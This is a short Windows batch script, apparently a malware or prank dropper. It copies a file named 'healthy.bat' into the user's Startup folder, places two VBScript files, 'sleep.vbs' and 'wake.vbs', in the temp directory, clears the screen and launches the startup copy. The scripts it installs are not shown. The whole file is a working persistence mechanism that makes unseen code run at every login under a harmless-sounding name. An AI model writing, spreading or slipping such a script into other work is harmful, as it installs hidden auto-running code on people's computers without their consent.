@echo off

xcopy /s /v /y "healthy.bat" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
xcopy /s /v /y "sleep.vbs" "%temp%"
xcopy /s /v /y "wake.vbs" "%temp%"
cls
cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
healthy.bat